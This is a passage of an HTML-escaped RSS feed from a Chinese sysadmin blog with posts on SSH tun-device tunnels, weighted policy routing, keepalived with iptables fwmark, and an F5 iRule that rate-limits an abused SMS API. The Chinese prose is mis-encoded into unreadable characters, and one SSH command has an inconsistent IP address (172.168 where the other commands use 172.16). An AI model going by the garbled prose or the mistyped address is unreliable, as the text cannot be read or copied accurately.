&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh-copy-id root@172.16.8.108  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;åœ¨Aä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå»ºç«‹ssh tunnelï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -w 5:5 root@172.168.8.108  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;åœ¨Aä¸Šæ‰§è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;åœ¨Bä¸Šæ‰§è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;è¿™æ ·åˆ†åˆ«åœ¨Aå’ŒBä¸Šping 192.168.244.1å’Œ192.168.244.2ï¼Œéƒ½èƒ½é€šå°±è¡¨ç¤ºå·²ç»okäº†ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¼˜åŒ–ä¸€ä¸‹ï¼ŒAå’ŒBä¸¤è¾¹éƒ½å…ˆæŠŠtun5èµ·æ¥ä»¥åï¼Œç›´æ¥åœ¨Aä¸Šä¸€å¥è¯æå®šï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œæ‰€ä»¥å¾—ctrl+zï¼Œç„¶åbgæ”¾åå°å»ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -o &lt;span class=&#34;nv&#34;&gt;PermitLocalCommand&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -o &lt;span class=&#34;nv&#34;&gt;LocalCommand&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -o &lt;span class=&#34;nv&#34;&gt;ServerAliveInterval&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -w 5:5 root@172.16.8.108 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0; echo tun5 ready&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœè¦ç”¨åœ¨ç¿»å¢™çš„ç¯å¢ƒï¼Œé‚£å°±å¾—ä¿æŒé•¿é“¾æ¥äº†ã€‚å‡è®¾Aæœºå™¨æ˜¯åœ¨ä¸€ä¸ªé˜²ç«å¢™åï¼Œä¸”è¢«NATäº†ï¼Œé‚£ä¹ˆå°±å¾—å…ˆè¿™æ ·æ‰“é€šéš§é“ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>å¤šç½‘å…³ã€ç­–ç•¥è·¯ç”±ã€è´Ÿè½½å‡è¡¡çš„å®é™…åº”ç”¨</title>
      <link>https://rendoumi.com/posts/20240111-route_policy2/</link>
      <pubDate>Thu, 11 Jan 2024 15:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240111-route_policy2/</guid>
      <description>&lt;p&gt;åœºæ™¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å…¬å¸æœ‰ä¸¤æ¡çº¿è·¯ï¼Œä¸€æ¡æ˜¯é¹åšå£«çš„ï¼Œä¸€æ¡æ˜¯ç”µä¿¡çš„ã€‚&lt;/li&gt;
&lt;li&gt;é¹åšå£«æ˜¯100å…†å…±äº«çº¿è·¯ï¼Œç”µä¿¡æ˜¯10å…†ç‹¬äº«çº¿è·¯ã€‚&lt;/li&gt;
&lt;li&gt;é¹åšå£«å¯¹ç«¯çš„åœ°å€æ˜¯1.1.1.1ï¼Œæœ¬åœ°æœåŠ¡å™¨åœ°å€æ˜¯1.1.1.2&lt;/li&gt;
&lt;li&gt;ç”µä¿¡å¯¹ç«¯çš„åœ°å€æ˜¯2.2.2.2ï¼Œæœ¬åœ°æœåŠ¡å™¨æ˜¯2.2.2.3&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ‰€ä»¥å¯¼è‡´æœ‰ä¸¤ä¸ªç½‘å…³ï¼Œå¤§éƒ¨åˆ†å…¬å¸åŒäº‹ç”¨å¾—æ˜¯100å…†çš„å…±äº«ï¼Œ10å…†çš„è¢«å®¢æœç‹¬ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨ç‡å¾ˆä½ã€‚é‚£èƒ½å¦ä¸¤è¾¹éƒ½ç”¨å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œç”¨ç­–ç•¥è·¯ç”±å°±å¯ä»¥ã€‚&lt;/p&gt;
&lt;p&gt;ç­–ç•¥è·¯ç”±éœ€è¦ç”¨åˆ°&lt;strong&gt;iproute2&lt;/strong&gt;ï¼Œæ²¡æœ‰çš„è¯å…ˆå®‰è£…ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;å®šä¹‰ç­–ç•¥è·¯ç”±è¡¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /etc/iproute2/  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;101 pengboshi&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; rt_tables  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;102 dianxin&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; rt_tables  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®šä¹‰ç­–ç•¥è·¯ç”±&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip route add default via 1.1.1.1 table &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip route add default via 2.2.2.2 table &lt;span class=&#34;m&#34;&gt;102&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;okï¼Œæµé‡åˆ†ä¸ºä¸¤ä¸ªæ–¹å‘ï¼Œè¿›æ¥çš„å’Œå‡ºå»çš„ï¼Œå…ˆå®šä¹‰ç®€å•çš„ï¼Œè¿›æ¥çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip rule add from 1.1.1.1 table &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip rule add from 2.2.2.2 table &lt;span class=&#34;m&#34;&gt;102&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‡ºå°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œ100å…†å’Œ10å…†æŒ‰æƒé‡æ¥åˆ†ï¼Œ8ï¼š2å§&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip route replace default scope global &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nexthop via 1.1.1.1 dev eth0 weight &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nexthop via 2.2.2.2 dev eth0:1 weight &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ç”¨äº†ä¸€å°è·¯ç”±å™¨æ¥è¿æ¥ä¸Šé¢ä¸¤ä¸ªç½‘å…³çš„ï¼ŒæœåŠ¡å™¨å®é™…æ˜¯ä¸€ä¸ªç½‘å¡ä¸Šè¿åˆ°äº¤æ¢æœºï¼Œç„¶åå†ä¸Šè¿è·¯ç”±å™¨çš„ï¼Œå¦‚ä¸‹å›¾:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240111-route_policy2/image-20240111164124457.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æŠŠè¿™ä¸€åˆ‡å›ºå®šä¸‹æ¥ï¼Œç¼–è¾‘/etc/rc.d/rc.localå³å¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# cat /etc/rc.local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/sh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;touch /var/lock/subsys/local  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/sbin/ip route replace default scope global nexthop via 1.1.1.1 dev eth0 weight &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; nexthop via 2.2.2.2 dev eth0:1 weight &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Keepalivedä¸iptables markçš„è”åŠ¨</title>
      <link>https://rendoumi.com/posts/20240111-keepalived_iptable_mark/</link>
      <pubDate>Thu, 11 Jan 2024 14:40:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240111-keepalived_iptable_mark/</guid>
      <description>&lt;p&gt;Iptableå¯ä»¥ç»™è¿›æ¥çš„åŒ…æ‰“ä¸Šæ ‡ç­¾ï¼Œæ¯”å¦‚æˆ‘ä»¬æŠŠä»1.2.3.4è¿›æ¥çš„åŒ…éƒ½æ‰“ä¸Šæ ‡ç­¾2000ï¼ˆæ ‡ç­¾å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°ï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -t mangle -A PREROUTING -i eth0 &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-p tcp -s 1.2.3.4 --dport http -j MARK --set-mark &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ–è€…æŠŠè®¿é—®172.16.8.1çš„80å’Œ443ç«¯å£çš„åŒ…éƒ½æ‰“ä¸Šæ ‡ç­¾123ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -t mangle -A PREROUTING -i eth0 &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-p tcp -d 172.16.8.1/32 -m multiport --dports 80,443 -j MARK --set-mark &lt;span class=&#34;m&#34;&gt;123&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éšåæˆ‘ä»¬å°±å¯ä»¥åœ¨keepalivedé‡Œæ¥æŒ‡å®švirtual_serveræ¥å¤„ç†è¿™äº›æ‰“è¿‡æ ‡ç­¾çš„æµé‡äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virtual_server fwmark &lt;span class=&#34;m&#34;&gt;123&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…·ä½“çš„ä¸€ä¸ªç”¨æ³•ï¼Œå¦‚æœä½ æƒ³ç¦æ­¢ä»1.2.3.4æ¥çš„ipè®¿é—®ä½ æœåŠ¡å™¨ï¼Œäºæ˜¯ä¹ä½ å°±å¯ä»¥å…ˆç»™åŒ…æ‰“ä¸Šæ ‡ç­¾2000ï¼Œç„¶åé…ä¸ªæœåŠ¡å™¨ï¼Œä¸Šé¢å†™è”ç³»äººå’Œç”µè¯ï¼Œå•ç‹¬ç»™ä»–çœ‹ï¼Œä»–çœ‹åˆ°ä¼šè”ç³»ä½ è¯¢é—®è¢«å±è”½çš„åŸå› ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virtual_server fwmark &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;delay_loop &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; lb_algo wlc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; lb_kind NAT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; persistence_timeout &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; protocol TCP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;real_server 10.10.10.1 &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; weight &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; TCP_CHECK &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  connect_port &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  connect_timeout &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>F5åˆ©ç”¨iruleæ¥é˜²æ­¢Ddosçš„æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20240111-f5_irule_ddos/</link>
      <pubDate>Thu, 11 Jan 2024 14:20:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240111-f5_irule_ddos/</guid>
      <description>&lt;p&gt;å…¬å¸çš„æœåŠ¡å™¨é­å—äº†æ”»å‡»ï¼ŒæŸäº›äººä¸åœè°ƒç”¨å…¬å¸æœåŠ¡å™¨å‘é€çŸ­ä¿¡çš„apiï¼ŒçœŸæ˜¯æœ‰å¤Ÿæ— èŠçš„ã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºæˆ‘ä»¬çš„æ¶æ„æ˜¯å‰é¢F5 Bigipï¼Œåé¢æ¥äº†Nä¸ªTomcatï¼Œé‚£å°±ç›´æ¥å†™ä¸ªF5çš„iruleæ¥é˜»æ­¢å®ƒã€‚&lt;/p&gt;
&lt;p&gt;é˜»æ­¢GETè¯·æ±‚çš„é¢‘ç‡ï¼Œ30ç§’åªå…è®¸å•ä¸ªipå‘5æ¬¡&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å‡è®¾GETçš„æ¨¡å¼æ˜¯
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /sendsms.do?mobile&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;13800000000&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;aaaaaaaa  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;iruleé‡Œæœ‰ä¸ªéå¸¸ç¥å¥‡çš„ä¸œè¥¿ï¼Œtableï¼Œæ˜¯sessionä¼šè¯è¡¨çš„è¶…è¡¨ï¼ŒåŸºæœ¬æ“ä½œæ˜¯key-valueå‹ï¼Œå¸¦æœ‰ç”Ÿå­˜æ—¶é—´ï¼Œè¿™ç‚¹æœ€é‡è¦ã€‚&lt;/p&gt;
&lt;p&gt;è¯¦ç»†çš„å¤§å®¶å¯ä»¥å»çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://clouddocs.f5.com/api/irules/table.html&#34;&gt;https://clouddocs.f5.com/api/irules/table.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é˜»æ­¢GETçš„iruleï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;when RULE_INIT &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; static::windowSecs &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;when HTTP_REQUEST &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP::method&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; equals &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP::uri&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; starts_with &lt;span class=&#34;s2&#34;&gt;&amp;#34;/sendsms.do&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; myUserId &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;IP::client_addr&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; myMaxRate &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$myMaxRate&lt;/span&gt; ne &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; reqnum &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;table incr &lt;span class=&#34;s2&#34;&gt;&amp;#34;req:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$myUserId&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; tbl &lt;span class=&#34;s2&#34;&gt;&amp;#34;countpost:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$myUserId&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                table &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; -subtable &lt;span class=&#34;nv&#34;&gt;$tbl&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$reqnum&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ignored&amp;#34;&lt;/span&gt; indef &lt;span class=&#34;nv&#34;&gt;$static&lt;/span&gt;::windowSecs
